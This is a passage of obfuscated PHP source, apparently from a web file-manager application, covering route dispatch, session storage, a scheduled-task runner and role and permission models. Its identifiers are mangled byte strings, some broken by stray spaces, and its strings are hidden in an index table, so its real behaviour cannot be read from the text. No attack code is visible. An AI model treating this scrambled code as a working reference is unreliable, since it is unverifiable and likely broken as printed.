$e›¹¢†Á‰Ú[8]) === 0 ? $fŠöè¿‡Èò[1] : $e›¹¢†Á‰Ú[8] . $fŠöè¿‡Èò[1]; $F¹âóÀ©ğ = $fŠöè¿‡Èò[2]; } else { $dó¥’¤ã³Î = null; $aÌÚ†Öë±Ş = strpos($fŠöè¿‡Èò[0], $e›¹¢†Á‰Ú[8]) === 0 ? $fŠöè¿‡Èò[0] : $e›¹¢†Á‰Ú[8] . $fŠöè¿‡Èò[0]; $F¹âóÀ©ğ = $fŠöè¿‡Èò[1]; } array_push(self::$maps, $dó¥’¤ã³Î); array_push(self::$routes, $aÌÚ†Öë±Ş); array_push(self::$methods, strtoupper($cË¢¶ï“ÖÏ)); array_push(self::$callbacks, $F¹âóÀ©ğ); } public static function error($Fæã×Û²³¢) { self::$errorCallback = $Fæã×Û²³¢; } public static function haltOnMatch($dˆÇòé¸¡© = true) { self::$halts = $dˆÇòé¸¡©; } public static function dispatch() { goto Eš™ƒÓçŒå; a‚Í±©âóÅ: self::$routes = preg_replace($F¢Æ—Ó¼ ©[1136], $F¢Æ—Ó¼ ©[8], self::$routes); if (in_array($f°¨éííÄ, self::$routes)) { $D³ÒØæô‘ = array_keys(self::$routes, $f°¨éííÄ); foreach ($D³ÒØæô‘ as $cá½¸îÜÃ) { if (self::$methods[$cá½¸îÜÃ] == $F×òôùåñ || self::$methods[$cá½¸îÜÃ] == $F¢Æ—Ó¼ ©[1452] || in_array($F×òôùåñ, self::$maps[$cá½¸îÜÃ])) { $cËÙÉ×Æ›ó = !0; if (!is_object(self::$callbacks[$cá½¸îÜÃ])) { $DÇĞ®ï ‰¼ = explode($F¢Æ—Ó¼ ©[8], self::$callbacks[$cá½¸îÜÃ]); $DÄƒ¢ë›‹Ë = end($DÇĞ®ï ‰¼); $F–Øƒ©í‚Ÿ = explode($F¢Æ—Ó¼ ©[1453], $DÄƒ¢ë›‹Ë); $FÉ› è­» = new $F–Øƒ©í‚Ÿ[0](); $FÉ› è­»->{$F–Øƒ©í‚Ÿ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$cá½¸îÜÃ]); if (self::$halts) { return; } } } } } else { $bêï¿§‹ˆŠ = 0; foreach (self::$routes as $cá½¸îÜÃ) { if (strpos($cá½¸îÜÃ, $F¢Æ—Ó¼ ©[4]) !== !1) { $cá½¸îÜÃ = str_replace($Dì¾îÏ­×æ, $bÅ×æ ìÍ, $cá½¸îÜÃ); } if (preg_match($F¢Æ—Ó¼ ©[1454] . $cá½¸îÜÃ . $F¢Æ—Ó¼ ©[1455], $f°¨éííÄ, $Bô›”Şô‰¤)) { if (self::$methods[$bêï¿§‹ˆŠ] == $F×òôùåñ || self::$methods[$bêï¿§‹ˆŠ] == $F¢Æ—Ó¼ ©[1452] || !empty(self::$maps[$bêï¿§‹ˆŠ]) && in_array($F×òôùåñ, self::$maps[$bêï¿§‹ˆŠ])) { $cËÙÉ×Æ›ó = !0; array_shift($Bô›”Şô‰¤); if (!is_object(self::$callbacks[$bêï¿§‹ˆŠ])) { $DÇĞ®ï ‰¼ = explode($F¢Æ—Ó¼ ©[8], self::$callbacks[$bêï¿§‹ˆŠ]); $DÄƒ¢ë›‹Ë = end($DÇĞ®ï ‰¼); $F–Øƒ©í‚Ÿ = explode($F¢Æ—Ó¼ ©[1453], $DÄƒ¢ë›‹Ë); $FÉ› è­» = new $F–Øƒ©í‚Ÿ[0](); if (!method_exists($FÉ› è­», $F–Øƒ©í‚Ÿ[1])) { echo $F¢Æ—Ó¼ ©[1456]; } else { call_user_func_array(array($FÉ› è­», $F–Øƒ©í‚Ÿ[1]), $Bô›”Şô‰¤); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$bêï¿§‹ˆŠ], $Bô›”Şô‰¤); if (self::$halts) { return; } } } } $bêï¿§‹ˆŠ++; } } if ($cËÙÉ×Æ›ó == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $DÊÏ‚Ù™¢Š =& $_SERVER[Â€Á›¨õ]; header($_SERVER[$DÊÏ‚Ù™¢Š[1457]] . $DÊÏ‚Ù™¢Š[1458]); echo $DÊÏ‚Ù™¢Š[1459]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$F¢Æ—Ó¼ ©[1451]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto Eß÷È†õŞƒ; CŠø­ÇÀãÜ: $Dì¾îÏ­×æ = array_keys(static::$patterns); $bÅ×æ ìÍ = array_values(static::$patterns); $cËÙÉ×Æ›ó = !1; goto a‚Í±©âóÅ; Eš™ƒÓçŒå: $F¢Æ—Ó¼ © =& $_SERVER[Â€Á›¨õ]; $f°¨éííÄ = parse_url($_SERVER[$F¢Æ—Ó¼ ©[1451]], PHP_URL_PATH); $F×òôùåñ = $_SERVER[$F¢Æ—Ó¼ ©[156]]; goto CŠø­ÇÀãÜ; Eß÷È†õŞƒ: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto E®°è¡¨; E®°è¡¨: $e¤÷å©®ÕÜ =& $_SERVER[Â€Á›¨õ]; static $CÀ•ÕÉö¯ï = false; if ($CÀ•ÕÉö¯ï) { return $CÀ•ÕÉö¯ï; } goto bÄ¯éî¢ù; BÇ­ÂÙÇó›: if (self::$sessionSign) { } else { if (Cookie::get($D¢ÀÌ²¨Äø)) { self::$sessionSign = Cookie::get($D¢ÀÌ²¨Äø); } else { self::$sessionSign = guid(); } } Cookie::setSafe($D¢ÀÌ²¨Äø, self::$sessionSign, self::$sessionTime); $eÂäß•‘Åˆ = $d…£ÓÑà“Ù[$e¤÷å©®ÕÜ[1462]]; goto b—Ê–ŸÏ±•; B´ëÑ³Òš°: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $CÀ•ÕÉö¯ï = new self(); return $CÀ•ÕÉö¯ï; goto A¾ƒßŸ‘; bÄ¯éî¢ù: $d…£ÓÑà“Ù = $GLOBALS[$e¤÷å©®ÕÜ[6]][$e¤÷å©®ÕÜ[345]]; self::$sessionTime = $d…£ÓÑà“Ù[$e¤÷å©®ÕÜ[1460]]; $D¢ÀÌ²¨Äø = isset($GLOBALS[$e¤÷å©®ÕÜ[1461]]) ? $GLOBALS[$e¤÷å©®ÕÜ[1461]] : SESSION_ID; goto BÇ­ÂÙÇó›; b—Ê–ŸÏ±•: $a¨½¼Óµ à = $d…£ÓÑà“Ù[$eÂäß•‘Åˆ]; $e¥ŒÀÌÁ´³ = $d…£ÓÑà“Ù[$e¤÷å©®ÕÜ[770]]; switch ($eÂäß•‘Åˆ) { case $e¤÷å©®ÕÜ[17]: self::$handle = Model($e¤÷å©®ÕÜ[771]); break; case $e¤÷å©®ÕÜ[772]: self::$handle = new CacheRedis($a¨½¼Óµ à, $e¥ŒÀÌÁ´³); break; case $e¤÷å©®ÕÜ[773]: self::$handle = new CacheMemcached($a¨½¼Óµ à, $e¥ŒÀÌÁ´³); break; case $e¤÷å©®ÕÜ[173]: $a¨½¼Óµ à[$e¤÷å©®ÕÜ[75]] = $a¨½¼Óµ à[$e¤÷å©®ÕÜ[75]] . $e¤÷å©®ÕÜ[1463]; self::$handle = new CacheFile($a¨½¼Óµ à, $e¥ŒÀÌÁ´³); default: break; } goto B´ëÑ³Òš°; A¾ƒßŸ‘: } public static function sign($c°Óå‡éî§ = false) { $c°Óå‡éî§ && (self::$sessionSign = $c°Óå‡éî§); self::init(); return self::$sessionSign; } public static function set($CáŞšœ›, $f‡…ĞòÅø = false) { self::init(); if (is_array($CáŞšœ›)) { foreach ($CáŞšœ› as $BÉºâÇÄ³‡ => $e÷Û¬Ñã‰Á) { array_set_value(self::$data, $BÉºâÇÄ³‡, $e÷Û¬Ñã‰Á); } } else { array_set_value(self::$data, $CáŞšœ›, $f‡…ĞòÅø); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($cùõ¬ ˜• = false) { self::init(); if (!$cùõ¬ ˜•) { return self::$data; } return array_get_value(self::$data, $cùõ¬ ˜•); } public static function remove($eóõ–½ß•) { self::init(); unset(self::$data[$eóõ–½ß•]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Â€Á›¨õ][775])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto CŠËÀôÔ›; B…õíçĞ¸‰: while (!0) { self::cacheClear(); if (self::valueGet($a¤–àÔîäÉ[702]) != $a¤–àÔîäÉ[86]) { self::valueSet($a¤–àÔîäÉ[1464], $a¤–àÔîäÉ[491]); self::log($a¤–àÔîäÉ[1468]); die; } self::valueSet($a¤–àÔîäÉ[1464], $a¤–àÔîäÉ[86]); self::valueSet($a¤–àÔîäÉ[1465], time()); self::taskRunAll(); sleep(self::valueGet($a¤–àÔîäÉ[1469])); } goto EØ„¨“µª; CŠËÀôÔ›: $a¤–àÔîäÉ =& $_SERVER[Â€Á›¨õ]; if (self::valueGet($a¤–àÔîäÉ[702]) != $a¤–àÔîäÉ[86]) { return; } if (self::valueGet($a¤–àÔîäÉ[1464]) == $a¤–àÔîäÉ[86]) { $FÖ© Ñ‹è = self::valueGet($a¤–àÔîäÉ[1465]); if (time() - $FÖ© Ñ‹è > 3600 * 2) { self::restart(); } return; } goto A°éŞ¼ô°¹; A°éŞ¼ô°¹: http_close(); self::valueSet($a¤–àÔîäÉ[1464], $a¤–àÔîäÉ[86]); Hook::bind($a¤–àÔîäÉ[1466], $a¤–àÔîäÉ[1467]); goto B…õíçĞ¸‰; EØ„¨“µª: } public static function restart() { $c’ªˆÉêô§ =& $_SERVER[Â€Á›¨õ]; http_close(); self::valueSet($c’ªˆÉêô§[702], $c’ªˆÉêô§[491]); sleep(self::valueGet($c’ªˆÉêô§[1469]) + 5); self::valueSet($c’ªˆÉêô§[1464], $c’ªˆÉêô§[491]); self::valueSet($c’ªˆÉêô§[702], $c’ªˆÉêô§[86]); } public static function shutdownEvent() { $f´²ØäÍë´ =& $_SERVER[Â€Á›¨õ]; self::valueSet($f´²ØäÍë´[1464], $f´²ØäÍë´[491]); self::log($f´²ØäÍë´[1470]); } public static function config($DÏ”„¯Ü¤æ, $eŞù–óØÓ·) { $B°ÂÂÃ‘¬» =& $_SERVER[Â€Á›¨õ]; $B»²áÈ†µŒ = 10; $eŞù–óØÓ· = intval($eŞù–óØÓ·) <= $B»²áÈ†µŒ ? $B»²áÈ†µŒ : intval($eŞù–óØÓ·); self::valueSet($B°ÂÂÃ‘¬»[702], $DÏ”„¯Ü¤æ); self::valueSet($B°ÂÂÃ‘¬»[1469], $eŞù–óØÓ·); } private static function taskRunAll() { goto d–Ş—Èñ¥æ; B—ÒÑ”Šê: self::taskQueueRun($bà‘…è” Î); self::closeDatabase(); goto aÛÆçÆÜÆğ; d–Ş—Èñ¥æ: $Eë²Ã­‹èÚ =& $_SERVER[Â€Á›¨õ]; $bà‘…è” Î = timeFloat(); $a¹„’ùµŒæ = Model($Eë²Ã­‹èÚ[1471])->listData(); goto bŠ¶ä¾Çö«; bŠ¶ä¾Çö«: $dÚ²Ò¬¯²Ö = count($a¹„’ùµŒæ); for ($b…¥ñ‘Ü¬ = 0; $b…¥ñ‘Ü¬ < $dÚ²Ò¬¯²Ö; $b…¥ñ‘Ü¬++) { $DŞ•æó³Ï = $a¹„’ùµŒæ[$b…¥ñ‘Ü¬]; if (!$DŞ•æó³Ï[$Eë²Ã­‹èÚ[388]] || $DŞ•æó³Ï[$Eë²Ã­‹èÚ[1472]] != $Eë²Ã­‹èÚ[86]) { continue; } if (!self::taskTimeCheck($DŞ•æó³Ï)) { continue; } self::taskRun($DŞ•æó³Ï); } Hook::trigger($Eë²Ã­‹èÚ[1473]); goto B—ÒÑ”Šê; aÛÆçÆÜÆğ: } private static function taskQueueRun($B˜Ìòê­±ƒ) { $aå¤…ˆéŠˆ = 10; while (!0) { $AÕÍçÌ…³ = TaskQueue::run(); if ($AÕÍçÌ…³ === !1) { break; } if (timeFloat() - $B˜Ìòê­±ƒ >= $aå¤…ˆéŠˆ) { break; } } } private static function taskTimeCheck($Aˆšò¤çì) { goto EÃô§Õ¬Ğ†; EÃô§Õ¬Ğ†: $AÏ’Í…Æ»ù =& $_SERVER[Â€Á›¨õ]; $C’…³‘Œ¢ = json_decode($Aˆšò¤çì[$AÏ’Í…Æ»ù[195]], !0); $DŸä›Àõá = intval($Aˆšò¤çì[$AÏ’Í…Æ»ù[1465]]); goto B¦ª÷–†ÓÌ; e„‹äÙØÔŞ: switch ($C’…³‘Œ¢[$AÏ’Í…Æ»ù[29]]) { case $AÏ’Í…Æ»ù[1480]: if (time() - $DŸä›Àõá < 3600 * 24 * 30) { return !1; } if ($C’…³‘Œ¢[$AÏ’Í…Æ»ù[1480]] == date($AÏ’Í…Æ»ù[1481]) && $e ñ…©„›) { return !0; } break; case $AÏ’Í…Æ»ù[1482]: if (time() - $DŸä›Àõá < 3600 * 24 * 7) { return !1; } $dñã²å·î· = date($AÏ’Í…Æ»ù[1483]) == 0 ? 7 : date($AÏ’Í…Æ»ù[1483]); if ($C’…³‘Œ¢[$AÏ’Í…Æ»ù[1482]] == $dñã²å·î· && $e ñ…©„›) { return !0; } break; case $AÏ’Í…Æ»ù[1475]: if (time() - $DŸä›Àõá < 3600 * 24) { return !1; } if ($e ñ…©„›) { return !0; } break; case $AÏ’Í…Æ»ù[1484]: if (time() - $DŸä›Àõá >= floatval($C’…³‘Œ¢[$AÏ’Í…Æ»ù[1484]]) * 60) { return !0; } break; default: break; } return !1; goto fÃŒÈ÷ÈƒŒ; B¦ª÷–†ÓÌ: $dë“‰ç÷˜ˆ = strtotime($AÏ’Í…Æ»ù[1474] . $C’…³‘Œ¢[$AÏ’Í…Æ»ù[1475]] . $AÏ’Í…Æ»ù[1476]) - strtotime($AÏ’Í…Æ»ù[1477]); $D¨¤áœå = time() - strtotime(date($AÏ’Í…Æ»ù[1478]) . $AÏ’Í…Æ»ù[1479]); $e ñ…©„› = $D¨¤áœå >= $dë“‰ç÷˜ˆ && $D¨¤áœå <= $dë“‰ç÷˜ˆ + 3600; goto e„‹äÙØÔŞ; fÃŒÈ÷ÈƒŒ: } private static function closeDatabase() { goto fôĞµÕÕ¦¬; Cåªáğ¤: if (!$bä¯ôƒŒèí) { $bä¯ôƒŒèí = time(); } if (time() - $bä¯ôƒŒèí < $CÓÖ†¿‰×) { return; } $bä¯ôƒŒèí = time(); goto EÖö¥°Æ•; fôĞµÕÕ¦¬: $CÍÁêˆÜ£— =& $_SERVER[Â€Á›¨õ]; static $bä¯ôƒŒèí = 0; $CÓÖ†¿‰× = 1800; goto Cåªáğ¤; EÖö¥°Æ•: $C²÷Òœèœ = Model($CÍÁêˆÜ£—[497])->db($CÍÁêˆÜ£—[33]); if ($C²÷Òœèœ) { $C²÷Òœèœ->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($CÍÁêˆÜ£—[1485], $CÍÁêˆÜ£—[1486]); die; } goto bƒÊ¿¢äŞï; bƒÊ¿¢äŞï: } public static function taskRun($eèÑ‘çóã) { goto F“˜Š†ì†; eÖº–„ê‹Ñ: $bÈÕÆæíê” = timeFloat(); $Cö‘È£¹ÀÕ = $aŒÕôÙ„š[33]; switch ($eèÑ‘çóã[$aŒÕôÙ„š[29]]) { case $aŒÕôÙ„š[303]: $fò·áÊç¼ƒ = url_request($eèÑ‘çóã[$aŒÕôÙ„š[1490]], $aŒÕôÙ„š[226], !1, !1, !1, !1, 5); $Cö‘È£¹ÀÕ = strlen($fò·áÊç¼ƒ); break; case $aŒÕôÙ„š[225]: $Cö‘È£¹ÀÕ = Hook::apply($eèÑ‘çóã[$aŒÕôÙ„š[1490]]); default: break; } goto BÄí…¾°ã; F“˜Š†ì†: $aŒÕôÙ„š =& $_SERVER[Â€Á›¨õ]; self::log($aŒÕôÙ„š[1487] . $eèÑ‘çóã[$aŒÕôÙ„š[388]] . $aŒÕôÙ„š[1488] . $eèÑ‘çóã[$aŒÕôÙ„š[28]] . $aŒÕôÙ„š[1489] . $eèÑ‘çóã[$aŒÕôÙ„š[1490]]); Model($aŒÕôÙ„š[1471])->run($eèÑ‘çóã[$aŒÕôÙ„š[388]]); goto eÖº–„ê‹Ñ; BÄí…¾°ã: Model($aŒÕôÙ„š[1491])->add(array($aŒÕôÙ„š[1492] => $aŒÕôÙ„š[33], $aŒÕôÙ„š[1493] => $aŒÕôÙ„š[491], $aŒÕôÙ„š[29] => $aŒÕôÙ„š[1494] . $eèÑ‘çóã[$aŒÕôÙ„š[388]], $aŒÕôÙ„š[1495] => json_encode(array($aŒÕôÙ„š[28] => $eèÑ‘çóã[$aŒÕôÙ„š[28]], $aŒÕôÙ„š[1496] => timeFloat() - $bÈÕÆæíê”, $aŒÕôÙ„š[289] => $Cö‘È£¹ÀÕ)))); self::log($aŒÕôÙ„š[1497] . $eèÑ‘çóã[$aŒÕôÙ„š[388]] . $aŒÕôÙ„š[1498] . $Cö‘È£¹ÀÕ); return !0; goto AÃÖ•Ò¾¶é; AÃÖ•Ò¾¶é: } private static function valueGet($b…ôøø†») { $bíí‰‰„ =& $_SERVER[Â€Á›¨õ]; $fË§¯‡šÅÛ = $bíí‰‰„[1499]; $e­µÕˆ˜œ = Model($bíí‰‰„[1500])->get($b…ôøø†», $fË§¯‡šÅÛ); if (is_null($e­µÕˆ˜œ)) { Model($bíí‰‰„[1500])->set($bíí‰‰„[1469], 10, $fË§¯‡šÅÛ); Model($bíí‰‰„[1500])->set($bíí‰‰„[702], $bíí‰‰„[86], $fË§¯‡šÅÛ); Model($bíí‰‰„[1500])->set($bíí‰‰„[1464], $bíí‰‰„[491], $fË§¯‡šÅÛ); $e­µÕˆ˜œ = Model($bíí‰‰„[1500])->get($b…ôøø†», $fË§¯‡šÅÛ); } return $e­µÕˆ˜œ; } private static function valueSet($DôÙò‘ÂÄ, $c°êí–) { $e…çÄë¾á² =& $_SERVER[Â€Á›¨õ]; return Model($e…çÄë¾á²[1500])->set($DôÙò‘ÂÄ, $c°êí–, $e…çÄë¾á²[1499]); } protected static function log($AÇæ´Æ™Ş¥) { write_log($AÇæ´Æ™Ş¥, $_SERVER[Â€Á›¨õ][1486]); } private static function cacheClear() { $AéäˆÀ§Ã =& $_SERVER[Â€Á›¨õ]; $B¨ôÎ½ò£õ = Model($AéäˆÀ§Ã[1500])->cacheKey($AéäˆÀ§Ã[1499]); Cache::clearMemory($B¨ôÎ½ò£õ); Model($AéäˆÀ§Ã[1471])->cacheClear(); } } goto EòğğßÙÍ; a‚Å’: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\x2e\162\157\x6c\x65\114\151\163\x74"; public $field = array("\x6e\x61\155\x65", "\x61\x75\164\x68", "\154\x61\x62\x65\x6c", "\144\151\x73\x70\154\x61\x79", "\x73\171\x73\164\145\x6d", "\x64\x65\x73\x63", "\x69\147\x6e\x6f\162\x65\x45\170\164", "\151\x67\x6e\157\x72\145\106\x69\x6c\x65\x53\x69\172\145", "\141\x64\155\151\156\x69\x73\164\x72\141\164\x6f\x72", "\x73\x6f\162\x74"); public function listData($D™“‰÷Ã’– = false, $FÜ˜›±¦Ïí = "\163\157\x72\x74", $CßÖó¾àÛ¹ = false) { $eÕŠâĞİ· =& $_SERVER[Â€Á›¨õ]; $C¬Ä÷ñ¼¤ä = parent::listData($D™“‰÷Ã’–, $FÜ˜›±¦Ïí, $CßÖó¾àÛ¹); if (!$D™“‰÷Ã’–) { foreach ($C¬Ä÷ñ¼¤ä as $e‡ˆÖŸ­Õ» => $cîÂ¶Î¥Ï•) { if ($cîÂ¶Î¥Ï•[$eÕŠâĞİ·[1854]] == 1) { $C¬Ä÷ñ¼¤ä[$e‡ˆÖŸ­Õ»][$eÕŠâĞİ·[425]] = LNG($eÕŠâĞİ·[2074]); } } } return $C¬Ä÷ñ¼¤ä; } public function update($dÌÚˆëã, $DÜçãÅ×¸Ä) { goto E¹ë¼±éá”; E¹ë¼±éá”: $f…ó†ˆñÇÏ =& $_SERVER[Â€Á›¨õ]; $DÜÓÎ¬œ”Ô = parent::listData($dÌÚˆëã); $DŒÕî×È° = $this->findByName($DÜçãÅ×¸Ä[$f…ó†ˆñÇÏ[28]]); goto aÜˆôÉí©š; F«¹Š·â—: return parent::update($dÌÚˆëã, $DÜçãÅ×¸Ä); goto EÃ­¥ ­ó; aÜˆôÉí©š: if (!$DÜÓÎ¬œ”Ô || $DŒÕî×È° && $DŒÕî×È°[$f…ó†ˆñÇÏ[388]] != $DÜÓÎ¬œ”Ô[$f…ó†ˆñÇÏ[388]]) { return !1; } if ($DŒÕî×È°[$f…ó†ˆñÇÏ[1854]] == 1) { $DÜçãÅ×¸Ä = array($f…ó†ˆñÇÏ[28] => $DÜçãÅ×¸Ä[$f…ó†ˆñÇÏ[28]], $f…ó†ˆñÇÏ[1685] => $DÜçãÅ×¸Ä[$f…ó†ˆñÇÏ[1685]]); } $this->filterAuth($DÜçãÅ×¸Ä[$f…ó†ˆñÇÏ[400]]); goto F«¹Š·â—; EÃ­¥ ­ó: } public function remove($bŠ«”ñŒ°) { $fÌêÜİĞ×“ = parent::listData($bŠ«”ñŒ°); if (!$fÌêÜİĞ×“ || $fÌêÜİĞ×“[$_SERVER[Â€Á›¨õ][1143]]) { return !1; } return parent::remove($bŠ«”ñŒ°); } public function add($fÍèéÜÕ­ó) { goto dÒ¦‰Ãçì; E»¤ÖåÚ˜ª: return parent::insert($fÍèéÜÕ­ó); goto eÙÁİòÀ…¶; aŒŸò®Á”: $d™Òè§—ÍÉ = array($a‰”§ÛŒñ…[407] => $EÍ³ øªí, $a‰”§ÛŒñ…[1670] => $a‰”§ÛŒñ…[33], $a‰”§ÛŒñ…[1666] => $a‰”§ÛŒñ…[1674], $a‰”§ÛŒñ…[2075] => 1, $a‰”§ÛŒñ…[1669] => 0, $a‰”§ÛŒñ…[2076] => 0, $a‰”§ÛŒñ…[1668] => $this->getSort()); $fÍèéÜÕ­ó = array_merge($d™Òè§—ÍÉ, $fÍèéÜÕ­ó); $this->filterAuth($fÍèéÜÕ­ó[$a‰”§ÛŒñ…[400]]); goto E»¤ÖåÚ˜ª; dÒ¦‰Ãçì: $a‰”§ÛŒñ… =& $_SERVER[Â€Á›¨õ]; $EÍ³ øªí = $fÍèéÜÕ­ó[$a‰”§ÛŒñ…[28]]; if ($this->findByName($EÍ³ øªí)) { return !1; } goto aŒŸò®Á”; eÙÁİòÀ…¶: } private function getSort() { $dí¦†ì¬±Á =& $_SERVER[Â€Á›¨õ]; $A××ğÖ†Ÿç = parent::listData(); $Bæ¼É‚˜Ç = array_to_keyvalue($A××ğÖ†Ÿç, $dí¦†ì¬±Á[33], $dí¦†ì¬±Á[1687]); return empty($Bæ¼É‚˜Ç) ? 0 : max($Bæ¼É‚˜Ç) + 1; } private function filterAuth(&$dµ˜‘ŠÃ) { $DÙ‡‡ÏÈ²ã =& $_SERVER[Â€Á›¨õ]; $CŞÊÄğğÃá = array(); $cƒÒãá§³ã = array_filter(explode($DÙ‡‡ÏÈ²ã[47], $dµ˜‘ŠÃ)); foreach ($cƒÒãá§³ã as $dµ˜‘ŠÃ) { $BÒ‚¾½®‹ç = explode($DÙ‡‡ÏÈ²ã[94], $dµ˜‘ŠÃ); if ($BÒ‚¾½®‹ç[0] == $DÙ‡‡ÏÈ²ã[2077] && $BÒ‚¾½®‹ç[1] != $DÙ‡‡ÏÈ²ã[1064]) { $e¿îçÁ‡¤« = $BÒ‚¾½®‹ç[0] . $DÙ‡‡ÏÈ²ã[94] . $BÒ‚¾½®‹ç[1] . $DÙ‡‡ÏÈ²ã[2078]; if (!in_array($e¿îçÁ‡¤«, $cƒÒãá§³ã)) { $CŞÊÄğğÃá[] = $e¿îçÁ‡¤«; } } $CŞÊÄğğÃá[] = $dµ˜‘ŠÃ; } $dµ˜‘ŠÃ = implode($DÙ‡‡ÏÈ²ã[47], $CŞÊÄğğÃá); } public function sort($dáÀÓ¬ƒ¢, $dëÀ†¶¦†Í) { return parent::update($dáÀÓ¬ƒ¢, $dëÀ†¶¦†Í); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\x6d\x2e\164\x61\163\x6b\114\151\x73\164"; public $field = array("\156\x61\x6d\145", "\164\171\160\x65", "\145\x76\x65\x6e\x74", "\164\x69\x6d\x65", "\x64\145\163\143", "\163\x79\163\x74\145\155", "\145\156\x61\x62\154\145", "\154\x61\163\164\122\165\156", "\163\157\x72\x74"); public function listData($DŠ­§õ¿¯˜ = false, $aÆÙÃ‡§« = "\x73\157\x72\164", $CêˆµÙÍÖĞ = false) { return parent::listData($DŠ­§õ¿¯˜, $aÆÙÃ‡§«, $CêˆµÙÍÖĞ); } public function add($aó„Œ…‚Ğš) { $AóÑè®ô¸ =& $_SERVER[Â€Á›¨õ]; $Bãíù„êà… = $this->findByName($aó„Œ…‚Ğš[$AóÑè®ô¸[28]]); if ($Bãíù„êà…) { return !1; } $aó„Œ…‚Ğš[$AóÑè®ô¸[1465]] = 0; $aó„Œ…‚Ğš[$AóÑè®ô¸[1687]] = $this->getSort(); return parent::insert($aó„Œ…‚Ğš); } private function getSort() { $B•Û‘»í— =& $_SERVER[Â€Á›¨õ]; $cŞŒ¾½ó‚Ë = parent::listData(); $b…“ê­á•Á = array_to_keyvalue($cŞŒ¾½ó‚Ë, $B•Û‘»í—[33], $B•Û‘»í—[1687]); return empty($b…“ê­á•Á) ? 0 : max($b…“ê­á•Á) + 1; } public function update($Eà¬Ö¶ÒÒ±, $bğ–İÖ ¥ª) { $bßíâêÁò÷ =& $_SERVER[Â€Á›¨õ]; $B‚¹´áôé = $this->listData($Eà¬Ö¶ÒÒ±); $E¥á•Ó = $this->findByName($bğ–İÖ ¥ª[$bßíâêÁò÷[28]]); if (!$B‚¹´áôé || $E¥á•Ó && $E¥á•Ó[$bßíâêÁò÷[388]] != $B‚¹´áôé[$bßíâêÁò÷[388]]) { return !1; } return parent::update($Eà¬Ö¶ÒÒ±, $bğ–İÖ ¥ª); } public function remove($DÚÌí¬ã, $f²ÇÌ¨‰º‚ = false) { $CÒİÛôäÏ¯ =& $_SERVER[Â€Á›¨õ]; $f¯©ç÷ = $this->listData($DÚÌí¬ã); if (!$f¯©ç÷) { return; } if (!$f²ÇÌ¨‰º‚ && $f¯©ç÷[$CÒİÛôäÏ¯[1143]] == $CÒİÛôäÏ¯[86]) { return !1; } return parent::remove($DÚÌí¬ã); } public function enable($bÌ©…ƒìÏ, $C Àñ‰±ô†) { return $this->update($bÌ©…ƒìÏ, array($_SERVER[Â€Á›¨õ][2069] => $C Àñ‰±ô†)); } public function run($D—»¢„•™¤) { return $this->update($D—»¢„•™¤, array($_SERVER[Â€Á›¨õ][2079] => time())); } } goto aÕ‘­ÁÅ±™; f„˜º®Ç: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\x75\x72\x63\145\x5f\x61\x75\164\x68"; public function getAuth($Dô¿“¯ ¼¬) { goto Aº¯Í–¨²¨; Aº¯Í–¨²¨: $A•‚ä¯Õö =& $_SERVER[Â€Á›¨õ]; $eæ£ìªÆÍ = $this->sourceAuthSelect($Dô¿“¯ ¼¬); $EµÂœŠõáô = array(); goto DÇ§­œ—òï; DñÁˆĞõÌ: array_multisort($c„ÆÉõø›¢, SORT_DESC, $EµÂœŠõáô); return $EµÂœŠõáô; goto bôÚ›Õé†Ø; DÇ§­œ—òï: $c„ÆÉõø›¢ = array(); $cŠÇªï¾•Á = 2 << 25; foreach ($eæ£ìªÆÍ as $AÓ¦³øï”Ñ) { goto Açî—ĞÉïî; DÅèÆˆ° ò: $eÅë¼‚é¬Œ = 0; if ($AÓ¦³øï”Ñ[$A•‚ä¯Õö[398]] == SourceModel::TYPE_GROUP) { $eÅë¼‚é¬Œ = $cŠÇªï¾•Á * 2; } if ($AÓ¦³øï”Ñ[$A•‚ä¯Õö[398]] == SourceModel::TYPE_USER) { $eÅë¼‚é¬Œ = $cŠÇªï¾•Á; } goto dØ¼ŒÒöéá; Açî—ĞÉïî: $Aí«Ÿ›¬˜ì = Model($A•‚ä¯Õö[1832])->listData($AÓ¦³øï”Ñ[$A•‚ä¯Õö[1760]]); if (!$Aí«Ÿ›¬˜ì) { continue; } $EµÂœŠõáô[] = $AÓ¦³øï”Ñ; goto DÅèÆˆ° ò; dØ¼ŒÒöéá: if ($AÓ¦³øï”Ñ[$A•‚ä¯Õö[398]] == SourceModel::TYPE_USER && $AÓ¦³øï”Ñ[$A•‚ä¯Õö[478]] == $A•‚ä¯Õö[491]) { $eÅë¼‚é¬Œ = 0; } $c„ÆÉõø›¢[] = $Aí«Ÿ›¬˜ì[$A•‚ä¯Õö[400]] + $eÅë¼‚é¬Œ; goto B´Ùó–×˜; B´Ùó–×˜: } goto DñÁˆĞõÌ; bôÚ›Õé†Ø: } public function sourceAuthSelect($cÎ…·ÈóŸ) { goto dÃ¢‚˜œŸ; fÁƒ¬Û–ğ®: if ($BÌòŸœä) { return $E¯Åôáº”®; } return $eĞø½êÉÎ‹; goto c÷Ú‹šÀ´; BæÅÒÀ¿Ø¿: $E¯Åôáº”® = 